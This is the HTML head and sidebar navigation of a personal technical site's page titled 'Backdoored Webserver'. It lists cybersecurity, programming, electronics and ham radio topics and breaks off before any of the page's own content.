
<!DOCTYPE html>


<html lang="en" data-content_root="../../../../" >

  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Backdoored Webserver &#8212; MK Dynamics</title>
  
  
  
  <script data-cfasync="false">
    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
    document.documentElement.dataset.theme = localStorage.getItem("theme") || "";
  </script>
  <!--
    this give us a css class that will be invisible only if js is disabled
  -->
  <noscript>
    <style>
      .pst-js-only { display: none !important; }

    </style>
  </noscript>
  
  <!-- Loaded before other Sphinx assets -->
  <link href="../../../../_static/styles/theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
<link href="../../../../_static/styles/pydata-sphinx-theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />

    <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=03e43079" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/sphinx-book-theme.css?v=a3416100" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/togglebutton.css?v=13237357" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/copybutton.css?v=76b2166b" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/mystnb.4510f1fc1dee50b3e5859aac5469c37c29e427902b24a333a5f9fcb2f0b3ac41.css?v=be8a1c11" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/sphinx-thebe.css?v=4fa983c6" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/sphinx-design.min.css?v=95c83b7e" />
  
  <!-- So that users can add custom icons -->
  <script src="../../../../_static/scripts/fontawesome.js?digest=8878045cc6db502f8baf"></script>
  <!-- Pre-loaded scripts that we'll load fully later -->
  <link rel="preload" as="script" href="../../../../_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf" />
<link rel="preload" as="script" href="../../../../_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf" />

    <script src="../../../../_static/documentation_options.js?v=9eb32ce0"></script>
    <script src="../../../../_static/doctools.js?v=9a2dae69"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../../../../_static/clipboard.min.js?v=a7894cd8"></script>
    <script src="../../../../_static/copybutton.js?v=f281be69"></script>
    <script src="../../../../_static/scripts/sphinx-book-theme.js?v=887ef09a"></script>
    <script>let toggleHintShow = 'Click to show';</script>
    <script>let toggleHintHide = 'Click to hide';</script>
    <script>let toggleOpenOnPrint = 'true';</script>
    <script src="../../../../_static/togglebutton.js?v=4a39c7ea"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
    <script src="../../../../_static/design-tabs.js?v=f930bc37"></script>
    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-BZ3C1QVH0B"></script>
    <script>
                window.dataLayer = window.dataLayer || [];
                function gtag(){ dataLayer.push(arguments); }
                gtag('js', new Date());
                gtag('config', 'G-BZ3C1QVH0B');
            </script>
    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
    <script async="async" src="../../../../_static/sphinx-thebe.js?v=c100c467"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
    <script>
                window.dataLayer = window.dataLayer || [];
                function gtag(){ dataLayer.push(arguments); }
                gtag('js', new Date());
                gtag('config', 'G-BZ3C1QVH0B');
            </script>
    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
    <script>DOCUMENTATION_OPTIONS.pagename = 'Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver';</script>
    <link rel="icon" href="../../../../_static/spacey.jpg"/>
    <link rel="index" title="Index" href="../../../../genindex.html" />
    <link rel="search" title="Search" href="../../../../search.html" />
    <link rel="next" title="C++ Programming" href="../../CPP/cpp.html" />
    <link rel="prev" title="C Programming" href="../c__HEAD__.html" />
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="docsearch:language" content="en"/>
  <meta name="docsearch:version" content="" />
  </head>
  
  
  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">

  
  
  <div id="pst-skip-link" class="skip-link d-print-none"><a href="#main-content">Skip to main content</a></div>
  
  <div id="pst-scroll-pixel-helper"></div>
  
  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
    <i class="fa-solid fa-arrow-up"></i>Back to top</button>

  
  <dialog id="pst-search-dialog">
    
<form class="bd-search d-flex align-items-center"
      action="../../../../search.html"
      method="get">
  <i class="fa-solid fa-magnifying-glass"></i>
  <input type="search"
         class="form-control"
         name="q"
         placeholder="Search this book..."
         aria-label="Search this book..."
         autocomplete="off"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"/>
  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
</form>
  </dialog>

  <div class="pst-async-banner-revealer d-none">
  <aside id="bd-header-version-warning" class="d-none d-print-none" aria-label="Version warning"></aside>
</div>

  
    <header class="bd-header navbar navbar-expand-lg bd-navbar d-print-none">
    </header>
  

  <div class="bd-container">
    <div class="bd-container__inner bd-page-width">
      
      
      
      <dialog id="pst-primary-sidebar-modal"></dialog>
      <div id="pst-primary-sidebar" class="bd-sidebar-primary bd-sidebar">
        

  
  <div class="sidebar-header-items sidebar-primary__section">
    
    
    
    
  </div>
  
    <div class="sidebar-primary-items__start sidebar-primary__section">
        <div class="sidebar-primary-item">

  
    
  

<a class="navbar-brand logo" href="../../../../intro.html">
  
  
  
  
  
    
    
      
    
    
    <img src="../../../../_static/spacey.jpg" class="logo__image only-light" alt="MK Dynamics - Home"/>
    <img src="../../../../_static/spacey.jpg" class="logo__image only-dark pst-js-only" alt="MK Dynamics - Home"/>
  
  
</a></div>
        <div class="sidebar-primary-item">

<button class="btn search-button-field search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
 <i class="fa-solid fa-magnifying-glass"></i>
 <span class="search-button__default-text">Search</span>
 <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
</button></div>
        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item navbar-nav active">
        
        <ul class="nav bd-sidenav bd-sidenav__home-link">
            <li class="toctree-l1">
                <a class="reference internal" href="../../../../intro.html">
                    MK Dynamics
                </a>
            </li>
        </ul>
        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Cybersecurity</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Cybersecurity/cybersecurity.html">Cybersecurity</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../Cybersecurity/Basic_Linux_Exploits/basic_linux_exploits.html">Basic Linux Exploits</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/disassembling_binaries.html">Disassembling Binaries</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Fortran/fortran.html">Fortran</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Fortran/ARM64/arm64.html">ARM 64 Bit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Fortran/ARM32/arm32.html">ARM32</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Fortran/AMD64/amd64.html">AMD64</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Fortran/i386/i386.html">Intel 32 - Bit</a></li>
</ul>
</details></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/C/c.html">C</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/C%2B%2B/c%2B%2B.html">C++</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Ada/ada.html">Ada</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Cybersecurity/Disassembling_Binaries/Pascal/pascal.html">Pascal</a></li>
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../../Cybersecurity/LiveOverflow/liveoverflow.html">LiveOverflow</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Cybersecurity/Protostar/protostar.html">Protostar Exploit Exercises</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../Cybersecurity/Protostar/Stack0/stack0.html">Stack 0</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Protostar/Stack0/Stack0_x86/stack0_x86.html">x86 32-Bit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Protostar/Stack0/Stack0_AMD64/stack0_AMD64.html">AMD64</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Protostar/Stack0/Stack0_ARM32/stack0_ARM32.html">ARM 32 - Bit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Cybersecurity/Protostar/Stack0/Stack0_ARM64/stack0_ARM64.html">ARM 64 - Bit</a></li>
</ul>
</details></li>
</ul>
</details></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Cybersecurity/SLAE64/SLAE64.html">SLAE64 - x86_64 Assembly Language and Shellcoding on Linux</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Cybersecurity/SLAE64/Modules/Module_1/Section_3_GDB_Test/section_3_GDB_test.html">Lesson 3 - GDB Test</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../Cybersecurity/SLAE64/Modules/Module_1/Section_5_Hello_World/section_5_hello_world.html">Section 5 - Hello World</a></li>
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../../Cybersecurity/Shellcode_Generation_and_Testing/shellcode_generation_and_testing.html">Shellcode Generation and Testing</a></li>
</ul>
</details></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Computer Programming</span></p>
<ul class="current nav bd-sidenav">
<li class="toctree-l1 current active has-children"><a class="reference internal" href="../../computer_programming.html">Computer Programming</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../../Assembly/assembly.html">Assembly Language Programming</a></li>
<li class="toctree-l2 current active has-children"><a class="reference internal" href="../c__HEAD__.html">C Programming</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
<li class="toctree-l3 current active"><a class="current reference internal" href="#">Backdoored Webserver</a></li>
</ul>
</details></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../CPP/cpp.html">C++ Programming</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp__HEAD__.html">Object Oriented Programming Using C++</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_1.html">Chapter 1: Why Object-Oriented Programming in C++?</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_2.html">Chapter 2: Native Types and Statements</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_3.html">Chapter 3: Functions and Pointers</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_4.html">Chapter 4: Implementing ADTs in the Base Language</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_5.html">Chapter 5: Data Hiding and Member Functions</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_6.html">Chapter 6: Object Creation and Destruction</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../CPP/Object_Oriented_Programming_Using_Cpp/Object_Oriented_Programming_Using_Cpp_Ch_7.html">Chapter 7: Ad Hoc Polymorphism</a></li>
</ul>
</details></li>
</ul>
</details></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../Fortran/fortran.html">Fortran Programming</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/Modern_Fortran/modern_fortran.html">Modern Fortran</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Cold_Front_Calculator.html">Cold Front Calculator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Cold_Front_Calculator_with_Loop.html">Cold Front Calculator With Loop</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Tsunami_Simulator.html">Tsunami Simulator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Tsunami_Simulator_Plotter.html">Tsunami Simulator Plotter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Tsunami_Simulator_with_Modules.html">Tsunami Simulator with Modules</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Tsunami_Simulator_with_Modules_Plotter.html">Tsunami Simulator with Modules Plotter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Print_Compiler_Version.html">Print Compiler Version</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Modern_Fortran/Analyzing_Time_Series_Data_with_Arrays.html">Analyzing Time Series Data with Arrays</a></li>
</ul>
</details></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/Intro_to_Fortran/intro_to_fortran.html">Introduction to Programming Using Fortran</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Intro_to_Fortran/Section_7_Period_Calculator.html">Section 7: Pendulum Period Calculator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Intro_to_Fortran/Section_9_3_SOS_Difference.html">Section 9.3: Difference Between Sum of Squares and Square of Sums</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Intro_to_Fortran/Section_12_8_Line_Numbers.html">Section 12.8: Line Numbers</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Intro_to_Fortran/Section_14_Pi_Estimation.html">Section 14: Pi Estimation</a></li>
</ul>
</details></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/guide_to_fortran_2008_programming.html">Guide to Fortran 2008 Programming</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_1_8_Ex_2_Quadratic_Formula.html">Section 1.8 Example 2: Quadratic Equation</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_1_16_Factorial_Recursion.html">Section 1.16: Factorial Recursion</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_2_1_Associate_Construct.html">Section 2.1: Statement Blocks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_2_1_Statement_Blocks.html">Section 2.1: Associate Construct</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_3_4_Putting_Procedures_in_a_Module.html">Section 3.4: Putting Procedures in a Module</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_3_6_Ex_1_Median_of_Three.html">Section 3.6: Median of Three</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_3_8_Argument_Passing.html">Section 3.8: Argument Passing</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_3_17_Case_Study__Adaptive_Numberical_Integration.html">Section 3.17: Case Study: Adaptive Numerical Integration</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_4_1_Elsewhere_Example.html">Section 4.1: Elsewhere Example</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_8_1_Submodules.html">Section 8.1: Submodules</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_8_2_Time_Matrix_Multiply.html">Section 8.2: Time Matrix Multiply</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_8_7_Generic_Elemental_Procedures.html">Section 8.7: Generic Elemental Procedures</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Guide_to_Fortran_2008_Programming/Section_8_8_Findloc_Function.html">Section 8.8: Findloc Function</a></li>
</ul>
</details></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/Fortran_MOOC/fortran_mooc.html">Fortran MOOC</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Arrays.html">Section: Arrays</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Ball_Throw__Head__.html">Section: Ball Throw</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Bit_Manipulations__Head__.html">Section: Bit Manipulations</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Floating_Point.html">Section: Floating Point</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Call_By_Semantics.html">Section: Call By Semantics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Computing_Pi.html">Section: Computing Pi</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Implicit_vs_Explicit_Loops__Head__.html">Section: Implicit vs Explicit Loops</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_Block_Matrices__Head__.html">Section: Block Matrices</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Fortran_MOOC/Section_BLAS_LAPACK__Head__.html">Section: BLAS/LAPACK</a></li>
</ul>
</details></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/Neural_Fortran/neural_fortran__HEAD__.html">Neural Fortran</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/Neural_Fortran/Section_Examples_Sine_Wave.html">Neural Fortran Examples: Sine Wave</a></li>
</ul>
</details></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/DFFT/DFFT.html">Discretized Fourier Transform of Arbitrary Signal Using FFTW3 in Fortran</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/DFFT/Sine_Wave_10_Hz/sine_wave_10_hz.html">Sine Wave at 10Hz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/DFFT/Square_Wave_1_Hz_50_pct/square_wave_1_hz_50_pct.html">Square Wave at 1Hz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/DFFT/2_Sine_Waves/2sineXHz.html">Two Sine Waves with Different Frequencies</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/DFFT/Switched_Sine_Wave_1_kHz/switched_sine_wave_1_kHz.html">Switched 1 kHz Sine Wave</a></li>
</ul>
</details></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Fortran/CSV_Fortran/CSV_Fortran__HEAD__.html">CSV Fortran Module</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/CSV_Fortran/csv_fortran_read_csv.html">Section: Read CSV Files</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Fortran/CSV_Fortran/csv_fortran_write_csv.html">Section: Write CSV Files</a></li>
</ul>
</details></li>
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../Javascript/javascript.html">Javascript Programming</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../Kaggle/kaggle__HEAD__.html">Kaggle</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Kaggle/Python/python__HEAD__.html">Python</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Kaggle/Python/Python_Tutorial/python_tutorial.html">Python Tutorial: Hello, Python!</a></li>

<li class="toctree-l4"><a class="reference internal" href="../../Kaggle/Python/Python_Exercise/python_exercise.html">Python Exercise</a></li>

</ul>
</details></li>
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../PHP/php.html">PHP Programming</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../Python/python.html">Python Programming</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../Python/Python_Playground/Python_Playground__HEAD__.html">Python Playground: Geeky Projects for the Curious Programmer</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Python/Python_Playground/Section_Chapter_2_Draw_Circle.html">Chapter 2: Draw Circle using Turtle Graphics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Python/Python_Playground/Section_Chapter_2_Draw_Spiro.html">Chapter 2: Draw Spiro using Turtle Graphics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Python/Python_Playground/Section_Chapter_3_Conway.html">Chapter 3: Conway’s Game of Life</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Python/Python_Playground/Section_Chapter_4_Karplus_Strong.html">Chapter 4: Karplus Strong Algorithm</a></li>
</ul>
</details></li>
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../Jupyter_Widgets/Using_Interact.html">IPyWidgets: Using Interact</a></li>
</ul>
</details></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Electronics</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Electronics/electronics.html">Electronics</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Electronics/Analog_and_Digital/analog_and_digital.html">Analog and Digital Electronics</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Electronics/Analog_and_Digital/AD9850_DDS/AD9850_DDS.html">Variable Frequency Oscillator Using Direct Digital Synthesis</a></li>
</ul>
</details></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Electronics/Power_Electronics/power_electronics__HEAD__.html">Power Electronics</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../Electronics/Power_Electronics/Power_Supplies/power_supplies__HEAD__.html">Power Supplies</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Electronics/Power_Electronics/Power_Supplies/Forward_Converter_100V_to_5V_10A/forward_converter_100V_to_5V_10A.html">Forward Converter 100V to 5V at 10A</a></li>
</ul>
</details></li>
</ul>
</details></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Electronics/Solar_Power_Projects/solar_power_projects__HEAD__.html">Solar Power Projects</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="simple">
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../../Electronics/Single_Board_Computers_Running_Linux/single_board_computers_running_linux.html">Single Board Computers Running Linux</a></li>
</ul>
</details></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Finite Element Analysis</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Finite_Element_Analysis/finite_element_analysis.html">Finite Element Analysis</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../Finite_Element_Analysis/CAELinux_for_Thermal_Analysis/caelinux_for_thermal_analysis.html">CAELinux for Thermal Analysis</a></li>
</ul>
</details></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Ham Radio</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Ham_Radio/ham_radio.html">Ham Radio</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../Ham_Radio/Ham_Radio_Projects/ham_radio_projects.html">Ham Radio Projects</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Ham_Radio/Ham_Radio_Projects/Packet_Radio/packet_radio.html">Packet Radio</a></li>
</ul>
</details></li>
<li class="toctree-l2"><a class="reference internal" href="../../../Ham_Radio/Antenna_Simulation_using_4NEC2/antenna_simulation_using_4NEC2.html">Antenna Simulation using 4NEC2</a></li>
</ul>
</details></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">About Me</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../About_Me/aboutme.html">About Me</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../About_Me/Resume/resume.html">My Resume</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../About_Me/Certificates/certificates.html">My Certificates</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../About_Me/Certificates/certificates_coursera.html">Coursera Certificates</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../About_Me/Certificates/certificates_kaggle.html">Kaggle Certificates</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../About_Me/Certificates/certificates_tryhackme.html">Try Hack Me Certificates</a></li>
</ul>
</details></li>
</ul>
</details></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Website Updates</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="../../../Website_Updates/website_updates.html">Website Updates</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Miscellaneous</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Misc/misc__head__.html">Miscellaneous Home</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../Misc/useful_links.html">Useful Links</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../Misc/cybersecurity_links.html">Cybersecurity Online Resources</a></li>
</ul>
</details></li>
</ul>

    </div>
</nav></div>
    </div>
  
  
  <div class="sidebar-primary-items__end sidebar-primary__section">
      <div class="sidebar-primary-item">
